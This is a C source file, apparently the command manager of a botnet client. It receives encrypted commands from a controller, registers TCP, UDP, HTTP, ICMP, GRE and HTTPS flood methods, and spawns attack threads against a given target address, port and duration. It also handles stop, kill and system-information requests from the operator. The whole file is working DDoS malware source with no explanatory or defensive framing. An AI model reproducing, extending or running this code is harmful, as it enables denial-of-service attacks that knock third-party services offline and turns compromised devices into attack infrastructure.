#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

#define MODULE_TAG "manager"
#include "headers/debug.h"

#include "headers/manager.h"
#include "headers/lifecycle.h"
#include "headers/protocol.h"
#include "headers/attack_params.h"
#include "headers/crypto.h"
#include "headers/sysinfo.h"

#include "methods/tcp_method.h"
#include "methods/udp_method.h"
#include "methods/http_method.h"
#include "methods/icmp_method.h"
#include "methods/gre_method.h"
#ifdef HAVE_BEARSSL
#include "methods/https_method.h"
#endif

static thread_entry threads[MAX_THREADS];
static pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;

#define THREAD_JOIN_TIMEOUT_SEC 3

static attack_func command_handlers[256] = {0};

void manager_init(void) {
    DEBUG_PRINT("manager_init: initializing threads and handlers");
    memset(threads, 0, sizeof(threads));
    memset(command_handlers, 0, sizeof(command_handlers));

    command_handlers[CMD_TCP]  = tcp_method;
    command_handlers[CMD_UDP]  = udp_method;   
    command_handlers[CMD_HTTP] = http_method;  
    command_handlers[CMD_ICMP] = icmp_method;  
    command_handlers[CMD_GRE]  = gre_method;
#ifdef HAVE_BEARSSL
    command_handlers[CMD_HTTPS] = https_method;
#endif
    DEBUG_PRINT("manager_init: registered attack handlers");
}

static attack_option* parse_options(uint8_t* data, size_t len) {
    attack_option* head = NULL;
    attack_option* tail = NULL;
    size_t offset = 0;
    int opt_count = 0;
    
    DEBUG_PRINT("parse_options: parsing %zu bytes of options", len);
    
    while (offset + 3 <= len) {
        uint8_t opt_type = data[offset];
        uint16_t opt_len;
        memcpy(&opt_len, data + offset + 1, 2);
        opt_len = ntohs(opt_len);

        DEBUG_PRINT("parse_options: opt_type=0x%02X, opt_len=%u at offset=%zu", opt_type, opt_len, offset);

        if (offset + 3 + opt_len > len) {
            DEBUG_PRINT("parse_options: option exceeds buffer, breaking");
            break;
        }
        
        attack_option* opt = create_option(opt_type, opt_len, data + offset + 3);
        if (!opt) {
            DEBUG_PRINT("parse_options: create_option failed");
            break;
        }
        
        if (!head) {
            head = opt;
            tail = opt;
        } else {
            tail->next = opt;
            tail = opt;
        }
        
        opt_count++;
        offset += 3 + opt_len;
    }
    
    DEBUG_PRINT("parse_options: parsed %d options", opt_count);
    return head;
}

static attack_params* parse_command(uint8_t* data, size_t len) {
    uint8_t cmd = data[PROTO_OFF_CMD];
    int is_l3 = IS_L3_ATTACK(cmd);
    int header_size = is_l3 ? PROTO_L3_HEADER_SIZE : PROTO_L4_HEADER_SIZE;
    
    DEBUG_PRINT("parse_command: len=%zu, header_size=%d, is_l3=%d", len, header_size, is_l3);
    
    if (len < header_size) {
        DEBUG_PRINT("parse_command: buffer too small");
        return NULL;
    }
    
    attack_params* params = (attack_params*)calloc(1, sizeof(attack_params));
    if (!params) {
        DEBUG_PRINT("parse_command: calloc failed");
        return NULL;
    }
    
    params->target_addr.sin_family = AF_INET;
    memcpy(&params->target_addr.sin_addr.s_addr, data + PROTO_OFF_IP, 4);
    
    uint32_t duration;
    if (is_l3) {
        params->target_addr.sin_port = 0;
        memcpy(&duration, data + 5, 4);
        params->duration = ntohl(duration);
        
        char _addr_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &params->target_addr.sin_addr, _addr_str, sizeof(_addr_str));
        DEBUG_PRINT("parse_command: L3 target=%s, duration=%u", 
                    _addr_str, 
                    params->duration);
        
        if (len > PROTO_L3_HEADER_SIZE) {
            DEBUG_PRINT("parse_command: parsing %zu bytes of options", len - PROTO_L3_HEADER_SIZE);
            params->options = parse_options(data + PROTO_L3_HEADER_SIZE, len - PROTO_L3_HEADER_SIZE);
        } else {
            params->options = NULL;
        }
    } else {
        memcpy(&params->target_addr.sin_port, data + PROTO_OFF_PORT, 2);
        memcpy(&duration, data + PROTO_OFF_DURATION, 4);
        params->duration = ntohl(duration);
        
        char _addr_str2[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &params->target_addr.sin_addr, _addr_str2, sizeof(_addr_str2));
        DEBUG_PRINT("parse_command: L4 target=%s:%d, duration=%u", 
                    _addr_str2, 
                    ntohs(params->target_addr.sin_port),
                    params->duration);
        
        if (len > PROTO_L4_HEADER_SIZE) {
            DEBUG_PRINT("parse_command: parsing %zu bytes of options", len - PROTO_L4_HEADER_SIZE);
            params->options = parse_options(data + PROTO_OFF_OPTIONS, len - PROTO_L4_HEADER_SIZE);
        } else {
            params->options = NULL;
        }
    }
    
    params->active = 1;
    return params;
}

typedef struct {
    attack_func func;
    attack_params* params;
    int thread_idx;
} thread_wrapper_arg;

static void* thread_wrapper(void* arg) {
    thread_wrapper_arg* wrapper = (thread_wrapper_arg*)arg;
    
    DEBUG_PRINT("thread_wrapper: starting attack on slot %d", wrapper->thread_idx);
    
    if (wrapper->func && wrapper->params) {
        wrapper->func(wrapper->params);
    }
    
    DEBUG_PRINT("thread_wrapper: attack finished on slot %d", wrapper->thread_idx);
    
    pthread_mutex_lock(&thread_mutex);
    int idx = wrapper->thread_idx;
    if (idx >= 0 && idx < MAX_THREADS) {
        threads[idx].active = 0;
        if (threads[idx].params) {
            free_attack_params(threads[idx].params);
            threads[idx].params = NULL;
        }
    }
    pthread_mutex_unlock(&thread_mutex);
    
    free(wrapper);
    return NULL;
}

static int find_free_thread_slot(void) {
    for (int i = 0; i < MAX_THREADS; i++) {
        if (!threads[i].active) {
            return i;
        }
    }
    return -1;
}

static int spawn_attack_thread(attack_func func, attack_params* params) {
    DEBUG_PRINT("spawn_attack_thread: attempting to spawn attack");
    
    pthread_mutex_lock(&thread_mutex);
    
    int slot = find_free_thread_slot();
    if (slot < 0) {
        DEBUG_PRINT("spawn_attack_thread: no free slots (max=%d)", MAX_THREADS);
        pthread_mutex_unlock(&thread_mutex);
        return -1;
    }
    
    DEBUG_PRINT("spawn_attack_thread: using slot %d", slot);
    
    thread_wrapper_arg* wrapper = (thread_wrapper_arg*)malloc(sizeof(thread_wrapper_arg));
    if (!wrapper) {
        DEBUG_PRINT("spawn_attack_thread: malloc failed");
        pthread_mutex_unlock(&thread_mutex);
        return -1;
    }
    
    wrapper->func = func;
    wrapper->params = params;
    wrapper->thread_idx = slot;
    
    threads[slot].active = 1;
    threads[slot].params = params;
    
    if (pthread_create(&threads[slot].thread, NULL, thread_wrapper, wrapper) != 0) {
        DEBUG_PRINT("spawn_attack_thread: pthread_create failed");
        threads[slot].active = 0;
        threads[slot].params = NULL;
        free(wrapper);
        pthread_mutex_unlock(&thread_mutex);
        return -1;
    }
    
    DEBUG_PRINT("spawn_attack_thread: thread spawned in slot %d", slot);
    pthread_mutex_unlock(&thread_mutex);
    return slot;
}

int send_pong(int sockfd) {
    DEBUG_PRINT("send_pong: sending encrypted pong response");
    uint8_t pong = CMD_PONG;
    return crypto_send(sockfd, &pong, 1) >= 0 ? 0 : -1;
}

void wait_for_attacks(void) {
    pthread_t to_join[MAX_THREADS];
    int join_count = 0;

    pthread_mutex_lock(&thread_mutex);
    for (int i = 0; i < MAX_THREADS; i++) {
        if (threads[i].active) {
            to_join[join_count++] = threads[i].thread;
        }
    }
    pthread_mutex_unlock(&thread_mutex);

    DEBUG_PRINT("wait_for_attacks: waiting for %d threads to finish", join_count);

    for (int i = 0; i < join_count; i++) {
        struct timespec ts;
        clock_gettime(CLOCK_REALTIME, &ts);
        ts.tv_sec += THREAD_JOIN_TIMEOUT_SEC;
        #ifdef __GLIBC__
        pthread_timedjoin_np(to_join[i], NULL, &ts);
        #else
        pthread_join(to_join[i], NULL);
        #endif
    }
}

void stop_all_attacks(void) {
    DEBUG_PRINT("stop_all_attacks: stopping all active attacks");
    
    pthread_mutex_lock(&thread_mutex);
    
    int stopped = 0;
    for (int i = 0; i < MAX_THREADS; i++) {
        if (threads[i].active && threads[i].params) {
            threads[i].params->active = 0;
            stopped++;
        }
    }
    
    DEBUG_PRINT("stop_all_attacks: signaled %d threads to stop", stopped);
    pthread_mutex_unlock(&thread_mutex);
}

void stop_target_attacks(uint32_t target_ip) {
    DEBUG_PRINT("stop_target_attacks: stopping attacks for IP 0x%08X", target_ip);
    
    pthread_mutex_lock(&thread_mutex);
    
    int stopped = 0;
    for (int i = 0; i < MAX_THREADS; i++) {
        if (threads[i].active && threads[i].params) {
            if (threads[i].params->target_addr.sin_addr.s_addr == target_ip) {
                threads[i].params->active = 0;
                stopped++;
            }
        }
    }
    
    DEBUG_PRINT("stop_target_attacks: signaled %d threads to stop", stopped);
    pthread_mutex_unlock(&thread_mutex);
}

int handle_command(int sockfd, uint8_t* data, size_t len) {
    if (!data || len < 1) {
        DEBUG_PRINT("handle_command: invalid data or len");
        return -1;
    }
    
    uint8_t cmd_type = data[PROTO_OFF_CMD];
    DEBUG_PRINT("handle_command: cmd_type=0x%02X, len=%zu", cmd_type, len);

    switch (cmd_type) {
        case CMD_PING:
            DEBUG_PRINT("handle_command: received PING");
            if (send_pong(sockfd) != 0) return -1;
            return 1;
            
        case CMD_PONG:
            DEBUG_PRINT("handle_command: received PONG");
            return 0;
            
        case CMD_STOP:
            DEBUG_PRINT("handle_command: received STOP");
            stop_all_attacks();
            return 0;
            
        case CMD_STOP_TARGET:
            if (len >= 5) {
                uint32_t target_ip;
                memcpy(&target_ip, data + 1, 4);
                DEBUG_PRINT("handle_command: received STOP_TARGET for IP 0x%08X", target_ip);
                stop_target_attacks(target_ip);
            } else {
                DEBUG_PRINT("handle_command: STOP_TARGET invalid len=%zu", len);
            }
            return 0;
            
        case CMD_SYSINFO_REQ:
            DEBUG_PRINT("handle_command: received SYSINFO_REQ");
            {
                uint8_t sysinfo_buf[512];
                int resp_len = build_sysinfo_response(sysinfo_buf, sizeof(sysinfo_buf));
                if (resp_len > 0) {
                    crypto_send(sockfd, sysinfo_buf, resp_len);
                    DEBUG_PRINT("handle_command: sent SYSINFO_RESP (%d bytes)", resp_len);
                }
            }
            return 0;
            
        case CMD_KILL:
            DEBUG_PRINT("handle_command: received KILL - shutting down");
            stop_all_attacks();
            request_shutdown();
            return -2;
    }
    
    int is_l3 = IS_L3_ATTACK(cmd_type);
    int min_header = is_l3 ? PROTO_L3_HEADER_SIZE : PROTO_L4_HEADER_SIZE;
    
    if (len < min_header) {
        DEBUG_PRINT("handle_command: attack command too short (need %d, got %zu)", min_header, len);
        return -1;
    }
    
    attack_func handler = command_handlers[cmd_type];
    if (!handler) {
        DEBUG_PRINT("handle_command: no handler for cmd_type=0x%02X", cmd_type);
        return -1;
    }
    
    DEBUG_PRINT("handle_command: parsing attack command");
    attack_params* params = parse_command(data, len);
    if (!params) {
        DEBUG_PRINT("handle_command: parse_command failed");
        return -1;
    }

    uint16_t num_attack_threads = 1;
    attack_option* thread_opt = find_option(params, OPT_THREADS);
    if (thread_opt) {
        num_attack_threads = get_option_u16(thread_opt);
        if (num_attack_threads == 0) num_attack_threads = 1;
        DEBUG_PRINT("handle_command: threads option = %u", num_attack_threads);
    }

    if (num_attack_threads > MAX_THREADS) {
        DEBUG_PRINT("handle_command: clamping threads from %u to %d", num_attack_threads, MAX_THREADS);
        num_attack_threads = MAX_THREADS;
    }

    int spawned = 0;

    for (uint16_t i = 0; i < num_attack_threads; i++) {
        attack_params* thread_params;
        if (i == 0) {
            thread_params = params;
        } else {
            thread_params = (attack_params*)calloc(1, sizeof(attack_params));
            if (!thread_params) {
                DEBUG_PRINT("handle_command: failed to clone params for thread %u", i);
                continue;
            }
            memcpy(thread_params, params, sizeof(attack_params));
            thread_params->options = clone_options(params->options);
        }
        
        if (spawn_attack_thread(handler, thread_params) >= 0) {
            spawned++;
        } else {
            DEBUG_PRINT("handle_command: spawn_attack_thread failed for thread %u", i);
            free_attack_params(thread_params);
            if (i == 0) {
                DEBUG_PRINT("handle_command: first thread spawn failed, attack aborted");
                return 0;
            }
        }
    }
    
    DEBUG_PRINT("handle_command: spawned %d/%u attack threads", spawned, num_attack_threads);
    return 0;
}

void manager_cleanup(void) {
    DEBUG_PRINT("manager_cleanup: starting cleanup");
    stop_all_attacks();
    
    DEBUG_PRINT("manager_cleanup: joining threads");

    pthread_t to_join[MAX_THREADS];
    int join_count = 0;

    pthread_mutex_lock(&thread_mutex);
    for (int i = 0; i < MAX_THREADS; i++) {
        if (threads[i].active) {
            to_join[join_count++] = threads[i].thread;
        }
    }
    pthread_mutex_unlock(&thread_mutex);

    if (join_count > 0) {
        usleep(100000);
    }

    for (int i = 0; i < join_count; i++) {
        struct timespec ts;
        clock_gettime(CLOCK_REALTIME, &ts);
        ts.tv_sec += THREAD_JOIN_TIMEOUT_SEC;
        #ifdef __GLIBC__
        pthread_timedjoin_np(to_join[i], NULL, &ts);
        #else
        pthread_join(to_join[i], NULL);
        #endif
    }

    pthread_mutex_lock(&thread_mutex);
    for (int i = 0; i < MAX_THREADS; i++) {
        if (threads[i].params) {
            free_attack_params(threads[i].params);
            threads[i].params = NULL;
        }
        threads[i].active = 0;
    }
    pthread_mutex_unlock(&thread_mutex);
    DEBUG_PRINT("manager_cleanup: cleanup complete");
}
